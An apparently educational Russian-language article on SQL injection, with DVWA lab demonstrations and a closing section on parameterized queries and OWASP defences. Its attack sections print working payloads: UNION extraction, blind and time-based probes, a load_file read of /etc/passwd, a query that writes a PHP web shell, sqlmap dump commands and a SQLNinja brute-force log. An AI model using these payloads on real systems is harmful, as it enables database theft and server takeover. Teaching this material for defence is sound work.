# SQL-инъекция
## Описание
SQL-инъекция - это эксплуатирование неправильно заданного динамического SQL запроса. Если входные данные не фильтруются специальным образом, злоумышленник может встроить в этот запрос вредоносный код. 

В результате такой атаки злоумышленник может:

+ Выполненять произвольные запросы к базе данных приложения
+ Читать любую конфиденциальную информацию из БД, в том числе пароли пользователей, адреса и данные банковских карт
+ Редактировать и удалять данные из БД
+ Читать/записывать/удалять локальные файлы на сервере СУБД
+ Исполненить произвольные команды на сервере СУБД

## Теория
Язык структурированных запросов или сокращенно SQL (Structured Query Language) был создан в 70-х годах под названием «SEQUEL» для системы управления базами данных (СУБД). SQL создавался как простой и стандартизированный способ извлечения и управления данными. В базе данных хранится информация, необходимая для работы сайта – контент, логины/пароли, настройки и данные о посетителях и клиентах.

Существуют различные типы СУБД, среди которых выделяют **реляционные** и **нереляционные**. SQL инъекции возможны **только в реляционных** СУБД.
Наиболее популярные реляционные СУБД:
+ MySQL
+ MS SQL Server
+ PostgreSQL
+ Oracle 

Подробнее с понятиями SQL, СУБД и их классификациями, можно ознакомиться здесь:
```
https://itglobal.com/ru-ru/company/glossary/subd-sistema-upravleniya-bazami-dannyh/
https://www.nic.ru/help/chto-takoe-subd_8580.html
```

## Виды атак
1. Преобразование запроса с помощью добавления комментария для получения дополнительных результатов. 
   ```sql
   SELECT * FROM products WHERE category = 'Gifts' AND released = 1
   SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
   ```
   ```
   https://insecure-website.com/products?category=Gifts
   https://insecure-website.com/products?category=Gifts'--
   ```
2. **Нарушение логики запроса** с помощью добавления логических выражений и комментариев.
   ```sql
   SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
   SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
   ```
3. Атаки с помощью [**UNION**](https://portswigger.net/web-security/sql-injection/union-attacks) (команда "объединение таблиц" в SQL) для получения данных из разных таблиц базы данных.
   ```sql
   SELECT a, b FROM table1 UNION SELECT c, d FROM table2
   ' UNION SELECT username, password FROM users--
   ```
4. [Извлечение информации о БД](https://portswigger.net/web-security/sql-injection/cheat-sheet), такой как **тип, версия и структура базы данных**.
   ```sql
   SELECT @@version
   SELECT banner FROM v$version
   SELECT version()
   ```
5. [**Blind SQL injection**](https://ansar0047.medium.com/blind-sql-injection-detection-and-exploitation-cheatsheet-17995a98fed1) - инъекция SQL, при которой результаты запроса не возвращаются в ответах приложения. Реализуется с помощью запросов на условие с получением ошибки или временной задержки и возможным brute force.
   
   - **Условие с получением ошибки** (**conditional errors**). Если утверждение истино, то вызывается ошибка базы данных (например, деление на ноль), а иначе ошибка не происходит, сайт остаётся прежним.
   ```sql
   SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
   
   https://insecure-website.com/products?category=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
   ```
   - **Условие с получением временной задержки** (**conditional time delays**). Если утверждение истино, то вызывается временная задержка в базе данных при обработке запроса (например, 10 секунд), а иначе задержка не происходит.
   ```sql
   SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
   
   https://insecure-website.com/products?category=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
   ```

# Демонстрация атаки
## Error-based SQL инъекция
## Поиск уязвимости
SQL инъекция возможна в случаях, когда пользовательский ввод не фильтруется и не обрабатывается должным образом, прежде чем попадает в динамический SQL запрос. Следовательно, чтобы обнаружить SQL инъекцию, атакующему нужно проверять формы отправки данных на сервер.

Пример формы, отправляющей данные на сервер:

![](https://user-images.githubusercontent.com/58670841/178011121-b7c37611-c449-4b58-9440-09b7c460b804.png)
![](https://user-images.githubusercontent.com/58670841/178011152-b7bafc00-3d2a-4b07-aaa5-4319d38d363b.png)

*Источник: [DVWA](https://github.com/digininja/DVWA)*

Чтобы проверить атакуемую форму на наличие SQL инъекции, нужно попытаться изменить логику запроса, внедрив в отправляемые данные синтаксические конструкции языка SQL. Например, кавычку

![](https://user-images.githubusercontent.com/58670841/178011176-d2faef3f-35ab-497b-8b57-f97c5e4dbf20.png)

Если форма уязвима, получится нарушить логику приложения и вызвать ошибку.
![](https://user-images.githubusercontent.com/58670841/178011185-a4c2425a-c901-415c-a90d-5e69e1d4e6b4.png)

## Причина уязвимости
Происходит это, потому что введенные пользователем данные никак не фильтруются перед построением запроса на их основе.

Пример уязвимого кода на PHP:
```php
<?php
if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    switch ($_DVWA['SQLI_DB']) {
        case MYSQL:
            // Check database
            $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) ...
    }
    ...
}
?>
```
*Источник: [DVWA](https://github.com/digininja/DVWA)*

Как было сказано раньше, в этом примере данные, полученные от пользователя, не проходят предварительных проверок и сразу же подставляются в запрос. Эта ошибка позволяет атакующему внедрить в запрос конструкции, нарушающие логику работы приложения.

## Пример нагрузки, выполняющей чтение локальных файлов:
```sql
' union select 1, load_file('/etc/passwd') #
```
![](https://user-images.githubusercontent.com/58670841/178011168-7d0645e1-22cd-462f-8369-fda955f3ff2e.png)

*Источник: [DVWA](https://github.com/digininja/DVWA)*

В данном примере запрос 
```sql
SELECT first_name, last_name FROM users WHERE user_id = '$id';
``` 
после получения параметра `$id` от пользователя, преобразуется в следующую конструкцию:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '' union select 1, load_file('/etc/passwd') #';
``` 
которая и даёт атакующему возможность чтения локальных файлов.

## Пример нагрузки на получение shell'а:
```sql
' union select 1, '<?php system($_GET["cmd"]); ?>' into outfile '../../htdocs/cmd.php' #
```
В этом примере атакующий записывает PHP-скрипт
```php
<?php 
system($_GET["cmd"]); 
?>
```
в файл cmd.php.
Теперь атакующий может обратиться к этой веб-странице и через параметры GET запроса отправлять команды системе-жертве.

```
http://host/path/to/file/cmd.php?cmd=uname%20-a
```
![](https://user-images.githubusercontent.com/58670841/178011202-9b521ee3-cffe-489a-81b9-546323d9b992.png)

## Атака автоматизированными инструментами

Команда для запуска sqlmap:
```bash
sqlmap -u "http://host/DVWA-master/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=4074cf3daf9e2152349baee68c99a656; security=low" --proxy http://192.168.50.2:8080 --dump-all
```
Результат:

![](https://user-images.githubusercontent.com/58670841/178011203-a9cee84c-7f56-4edc-9aef-38db47a22ffc.png)

# Blind SQL-инъекция

### Пример вредоносного кода
```
http://site/?param=1' and ascii(substr(database(),1,1))>99#
```
```
SELECT title,description,body FROM items WHERE PARAM='1' and ascii(substr(database(),1,1))>99#'
```
![Пример](https://images-ext-2.discordapp.net/external/zDNOsE6BsiNmqGv4gV2XBvA34f_edv1xS8ufkK4vIw0/https/user-images.githubusercontent.com/79576423/178008923-835e7641-21f9-4904-8189-a03ee6ed6784.png)

*Источник: [DVWA](https://github.com/digininja/DVWA)*

### Пример поиска обнаружения Blind SQL-инъекции

Если веб-приложение уязвимо для SQL-инъекции, то оно, вероятно , ничего не вернет.Чтобы убедиться, необходимо ввести запрос , который вернет ‘true’:
```
http://site/?param=1' OR 1=1#
```
```
SELECT title,description,body FROM items WHERE PARAM='1' OR 1=1#'
```
![Пример](https://images-ext-2.discordapp.net/external/j4ObMAuDX0KZko_DOIifGQprIXVtxs5Gxj28flSynfY/https/user-images.githubusercontent.com/79576423/178008929-3f4150d5-aeb3-4b09-91ca-6e0de68b9746.png)

*Источник: [DVWA](https://github.com/digininja/DVWA)*

### Пример Time-based Blind SQL-инъекции

Этот тип слепой SQL-инъекции основан на том, что база данных приостанавливается на определенное время, а затем возвращает результаты, указывающие на успешное выполнение SQL-запроса.
```
1' AND sleep(7)#
```
![Пример](https://images-ext-2.discordapp.net/external/L5ZQA1M0Zt7sqHlAihdPNBA1_U3xDmuVRMnqNgVMMjE/https/user-images.githubusercontent.com/79576423/178008925-f4c9b5b9-d79b-40ac-bf0b-bc090d559aac.png)

*Источник: [DVWA](https://github.com/digininja/DVWA)*

### Атака автоматизированными инструментами
Примеры инструментов для проведения атаки:
* SQLNinja
  ```
  root@edge-linuxpen:~/sqlninja-0.2.3-r1# ./sqlninja -v -m bruteforce -w pass.txt
  Sqlninja rel. 0.2.3-r1
  Copyright (C) 2006-2008 icesurfer <r00t@northernfortress.net>
  [+] Parsing configuration file................
  - Host: state.govt.agency.us
  - Port: 443
  - SSL: yes
  - method: POST
  - page: /APPLICATION/Folder/AuthenticationPage.asp
  - stringstart: Submit=Submit&Password=pwned&UserName=auditor'
  - stringend: 
  - local host: 192.168.0.1
  - sniff device: eth0
  - domain: sqlninja.net
  [v] SSL connection forced
  [+] Target is: state.govt.agency.us
  [+] Wordlist has been specified: using dictionary-based bruteforce
  Number of concurrent processes  [min:1 max:10 default:3]
  > 1
  [v] Creating UNIX socket for children messages
  [v] Launching children processes
  [+] Bruteforcing the sa password. This might take a while
  dba password is...: servername
  bruteforce took 60 seconds
  [+] Trying to add current user to sysadmin group
  [+] Done! New connections will be run with administrative privileges! In case
    the server uses ODBC, you might have to wait a little bit
    (check sqlninja-howto.html)
  ```
* SQLMap
  ```bash
  sqlmap -u "http://host/DVWA-master/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=4074cf3daf9e2152349baee68c99a656; security=low"
  ```
  ![](https://user-images.githubusercontent.com/58670841/178011200-65776a5f-59c6-4567-98da-27e36e1a6135.png)

# Рекомендации
Большинство случаев SQL-инъекций можно предотвратить, используя функцию параметризованных запросов (prepared statements) вместо простого объединения пользовательских данных с запросами.

Следующий JAVA-код уязвим для SQL-инъекций, поскольку пользовательский ввод объединяется непосредственно с запросом:
```java
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```
Этот код можно легко переписать таким образом, чтобы пользовательский ввод не мешал структуре запроса. Для этого необходимо использовать параметризованные запросы:
```java
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```
Параметризованные запросы можно использовать в любой ситуации, когда ненадежные входные данные отображаются как данные в запросе, включая предложение WHERE и значения в операторе INSERT или UPDATE. 

Их нельзя использовать для обработки ненадежных входных данных в других частях запроса, таких как имена таблиц или столбцов или предложение ORDER BY. Функциональность приложения, которая помещает ненадежные данные в эти части запроса, должна будет использовать другой подход, например, внести в белый список разрешенные входные значения или использовать другую логику для обеспечения требуемого поведения.

Чтобы параметризованный запрос был эффективным для предотвращения SQL-инъекций, строка, используемая в запросе, всегда должна быть заданной константой и никогда не должна содержать никаких переменных данных из любого источника.

**[Пример безопасного кода (Java+Oracle)](https://docs.oracle.com/javase/tutorial/jdbc/basics/prepared.html):**
```java
public void updateCoffeeSales(HashMap<String, Integer> salesForWeek) throws SQLException {
    String updateString =
      "update COFFEES set SALES = ? where COF_NAME = ?";
    String updateStatement =
      "update COFFEES set TOTAL = TOTAL + ? where COF_NAME = ?";

    try (PreparedStatement updateSales = con.prepareStatement(updateString);
         PreparedStatement updateTotal = con.prepareStatement(updateStatement))
    
    {
      con.setAutoCommit(false);
      for (Map.Entry<String, Integer> e : salesForWeek.entrySet()) {
        updateSales.setInt(1, e.getValue().intValue());
        updateSales.setString(2, e.getKey());
        updateSales.executeUpdate();

        updateTotal.setInt(1, e.getValue().intValue());
        updateTotal.setString(2, e.getKey());
        updateTotal.executeUpdate();
        con.commit();
      }
    } catch (SQLException e) {
      JDBCTutorialUtilities.printSQLException(e);
      if (con != null) {
        try {
          System.err.print("Transaction is being rolled back");
          con.rollback();
        } catch (SQLException excep) {
          JDBCTutorialUtilities.printSQLException(excep);
        }
      }
    }
  }
```

Пример уязвимого кода (PHP):
```php
$name = $_POST["name"]
$value = $_POST["value"]

$stmt = "INSERT INTO REGISTRY (name, value) VALUES ($name, $value)"
```

**[Пример безопасного кода (PHP)](https://www.php.net/manual/ru/pdo.prepared-statements.php):**
```php
$name = $_POST["name"]
$value = $_POST["value"]

$stmt = $dbh->prepare("INSERT INTO REGISTRY (name, value) VALUES (:name, :value)");
$stmt->bindParam(':name', $name);
$stmt->bindParam(':value', $value);
```


Примеры безопасного кода, выполненного методом параметризованных/подготовленных запросов на других языках:
```
https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html
```

Если по каким-либо причинам не удаётся реализовать код с  параметризованными запросами, то возможны [следующие варианты](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) для создания безопасного кода:
- Использование правильно построенных хранимых процедур (Properly Constructed Stored Procedures).
- Проверка допустимых значений (Allow-list Input Validation).
- Экранирование всех введенных пользователем данных (Escaping All User Supplied Input). 

Кроме того, можно реализовать [дополнительные средства защиты](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) методом обеспечения наименьших привилегий, а также выполнения проверки допустимости значений (Allow-list Input Validation) в качестве вторичной защиты.

Подробнее о способах защиты от SQL инъекций можно узнать здесь:
```
https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
```

# Источники и дополнительная литература
